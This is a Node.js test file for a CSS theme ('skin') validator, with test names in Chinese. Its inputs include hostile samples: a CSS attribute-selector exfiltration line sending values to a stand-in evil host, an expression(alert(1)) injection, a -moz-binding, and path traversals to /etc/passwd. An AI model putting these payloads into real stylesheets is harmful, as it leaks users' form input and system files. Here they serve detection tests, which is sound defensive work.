"use strict";
const test = require("node:test");
const assert = require("node:assert/strict");
const fs = require("node:fs");
const os = require("node:os");
const path = require("node:path");
const { validateCss, resolveCss, normalizeManifest, scanLibrary, rules } = require("../src/index.js");

const OK_VARS = ":root{--color-bg:#000;--color-text:#fff;--color-accent:#0af;}";
const findingIds = (css, opts) => validateCss(css, opts).findings.map((f) => f.rule);

test("干净皮肤零 finding", () => {
  const r = validateCss(`${OK_VARS}\n#app{background:linear-gradient(#000,#123);}`);
  assert.equal(r.ok, true);
  assert.deepEqual(r.findings, []);
});

test("远程 url 是 error，且拦住套用", () => {
  const r = validateCss(`${OK_VARS}\n#app{background:url(https://evil.example/x.png);}`);
  assert.equal(r.ok, false);
  assert.equal(r.errors, 1);
  assert.equal(r.findings[0].rule, "remote-url");
  assert.equal(r.findings[0].line, 2);
});

test("协议相对 url 同样拦住", () => {
  assert.ok(findingIds(`${OK_VARS}\n#app{background:url(//evil.example/x.png);}`).includes("remote-url"));
});

test("注释里的远程 url 不算", () => {
  const r = validateCss(`/* 见 https://example.com/doc url(https://a/b.png) */\n${OK_VARS}`);
  assert.equal(r.errors, 0);
});

test("注释替换成等长空白，行号不漂", () => {
  const r = validateCss(`${OK_VARS}\n/* 多行\n注释 */\n#app{background:url(https://evil/x.png);}`);
  assert.equal(r.findings[0].line, 4);
});

test("CSS 逐字符外泄的两半都报出来", () => {
  const ids = findingIds(`${OK_VARS}\ninput[value^="a"]{background:url(https://evil/?a);}`);
  assert.ok(ids.includes("remote-url"));
  assert.ok(ids.includes("attribute-value-selector"));
});

test("脚本注入 / 旧式行为绑定是 error", () => {
  assert.ok(findingIds(`${OK_VARS}\n#a{x:expression(alert(1));}`).includes("script-injection"));
  assert.ok(findingIds(`${OK_VARS}\n#a{-moz-binding:url(x.xml);}`).includes("legacy-behavior"));
});

test("远程 @import 与远程字体是 error", () => {
  assert.ok(findingIds(`@import url("https://a/b.css");\n${OK_VARS}`).includes("remote-import"));
  assert.ok(findingIds(`@font-face{font-family:x;src:url(https://a/f.woff2);}\n${OK_VARS}`).includes("remote-font"));
});

test("infinite 动画是 warn，一次性 transition 不是", () => {
  assert.ok(findingIds(`${OK_VARS}\n#a{animation:p 2s infinite;}`).includes("infinite-animation"));
  assert.ok(!findingIds(`${OK_VARS}\n#a{transition:opacity .2s ease;}`).includes("infinite-animation"));
});

test("编译产物类名报警，手写类名不报", () => {
  assert.ok(findingIds(`${OK_VARS}\n.pI_x6G_frame{color:red;}`).includes("hashed-class-selector"));
  for (const ok of [".sidebar", ".block__element", ".text-2xl", ".hu-card", ".h_100"]) {
    assert.ok(!findingIds(`${OK_VARS}\n${ok}{color:red;}`).includes("hashed-class-selector"), ok);
  }
});

test("缺必需变量是 warn 不是 error", () => {
  const r = validateCss("#app{background:#000;}");
  assert.equal(r.errors, 0);
  assert.ok(r.findings.some((f) => f.rule === "missing-variable"));
});

test("素材不存在 / 越出目录都是 error", () => {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), "css-guard-"));
  fs.mkdirSync(path.join(dir, "assets"));
  fs.writeFileSync(path.join(dir, "assets", "bg.png"), "x");
  assert.equal(validateCss(`${OK_VARS}\n#a{background:url("__SKIN__/bg.png");}`, { dir }).errors, 0);
  assert.ok(findingIds(`${OK_VARS}\n#a{background:url("__SKIN__/nope.png");}`, { dir }).includes("missing-asset"));
  assert.ok(findingIds(`${OK_VARS}\n#a{background:url("__SKIN__/../../etc/passwd");}`, { dir }).includes("escape-assets"));
  fs.rmSync(dir, { recursive: true, force: true });
});

test("每条规则都带 why —— 界面直接显示，不能有空的", () => {
  for (const rule of [...rules.SECURITY_RULES, ...rules.QUALITY_RULES]) {
    assert.ok(rule.why && rule.why.length > 10, rule.id);
  }
});

test("resolveCss 换掉全部占位符并吃掉重复斜杠", () => {
  assert.equal(resolveCss('a{background:url("__SKIN__/a.png"),url("__SKIN__/b.png")}', "cssguard://x/"),
    'a{background:url("cssguard://x/a.png"),url("cssguard://x/b.png")}');
});

test("manifest 归一化补齐缺省字段", () => {
  const m = normalizeManifest({ name: "鲸吟" }, "whale-song");
  assert.equal(m.id, "whale-song");
  assert.deepEqual(m.tags, []);
  assert.equal(m.appearance, "both");
  assert.equal(m.assets, "assets");
});

test("非法 id 与越权 assets 被拒", () => {
  assert.throws(() => normalizeManifest({ name: "x", id: "../etc" }, "x"), /不合法/);
  assert.throws(() => normalizeManifest({ name: "x", assets: "../.." }, "x"), /相对路径/);
  assert.throws(() => normalizeManifest({ name: "x", assets: "/etc" }, "x"), /相对路径/);
});

test("坏皮肤只让自己 broken，不影响同目录其他皮肤", () => {
  const root = fs.mkdtempSync(path.join(os.tmpdir(), "css-guard-lib-"));
  fs.mkdirSync(path.join(root, "good"));
  fs.writeFileSync(path.join(root, "good", "skin.css"), OK_VARS);
  fs.writeFileSync(path.join(root, "good", "skin.json"), '{"name":"好的"}');
  fs.mkdirSync(path.join(root, "bad"));
  fs.writeFileSync(path.join(root, "bad", "skin.css"), OK_VARS);
  fs.writeFileSync(path.join(root, "bad", "skin.json"), "{ this is not json");
  const list = scanLibrary([root]);
  assert.equal(list.length, 2);
  assert.equal(list.find((s) => s.id === "good").broken, false);
  assert.equal(list.find((s) => s.id === "bad").broken, true);
  fs.rmSync(root, { recursive: true, force: true });
});

test("后面的根覆盖前面的同 id 皮肤", () => {
  const mk = (name) => {
    const root = fs.mkdtempSync(path.join(os.tmpdir(), "css-guard-ov-"));
    fs.mkdirSync(path.join(root, "shared"));
    fs.writeFileSync(path.join(root, "shared", "skin.css"), OK_VARS);
    fs.writeFileSync(path.join(root, "shared", "skin.json"), JSON.stringify({ name }));
    return root;
  };
  const builtin = mk("内置");
  const user = mk("用户改的");
  const list = scanLibrary([builtin, user]);
  assert.equal(list.length, 1);
  assert.equal(list[0].name, "用户改的");
  fs.rmSync(builtin, { recursive: true, force: true });
  fs.rmSync(user, { recursive: true, force: true });
});

test("中文 / 带空格的目录名能推出合法 id，显示名保持原样", () => {
  const zh = normalizeManifest({}, "我调的配色");
  assert.match(zh.id, /^[a-z0-9][a-z0-9-]*$/, "id 要能安全地进 URL 和路径");
  assert.equal(zh.name, "我调的配色", "显示的还是用户自己起的名字");
  assert.equal(zh.derivedId, true);
  const spaced = normalizeManifest({}, "My Skin 2");
  assert.match(spaced.id, /^my-skin-2-/);
});

test("推出来的 id 跨次启动稳定，不同名字不撞车", () => {
  // 不稳定的话，设置里记的「当前皮肤」下次启动就对不上了
  assert.equal(normalizeManifest({}, "青瓷").id, normalizeManifest({}, "青瓷").id);
  assert.notEqual(normalizeManifest({}, "配色A").id, normalizeManifest({}, "配色B").id);
});

test("skin.json 里显式写错的 id 仍然当场报错", () => {
  // 推导只兜底目录名。作者自己写进 skin.json 的 id 是一句声明，写错要立刻知道。
  assert.throws(() => normalizeManifest({ id: "../evil" }, "fine"), /不合法/);
  assert.throws(() => normalizeManifest({ id: "Has Upper" }, "fine"), /不合法/);
});
